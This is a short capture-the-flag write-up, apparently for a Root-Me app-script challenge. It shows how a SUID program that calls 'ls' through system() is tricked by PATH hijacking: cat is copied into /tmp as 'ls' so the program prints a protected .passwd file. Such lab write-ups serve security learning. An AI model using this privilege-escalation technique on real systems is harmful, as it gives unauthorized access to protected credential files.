```
ssh -p 2222 app-script-ch11@challenge02.root-me.org
```

```
#include <stdlib.h>
#include <stdio.h>

/* gcc -m32 -o ch11 ch11.c */

int main(void)
{
        system("ls /challenge/app-script/ch11/.passwd");
        return 0;
}
```

The idea is to cat the file instead of ls. We have access to a shell, but we do not have any right to cat the file.
But the program possesses the rights of its creator, it is called a SUID.

So if we can trick the program, by changing the command ls to cat, we win.

We can write in the /tmp folder. We are going to create a new folder for this.

```bash
mkdir /tmp/vuln
cp /bin/cat /tmp/vuln
mv /tmp/vuln/cat /tmp/vuln/ls
export PATH=/tmp/vuln:$PATH
./ch11
```

We changed the path so that a call to the function ls is a call to a function ls that we defined in /tmp/vuln, which is the function cat.

Then we prompt the response.
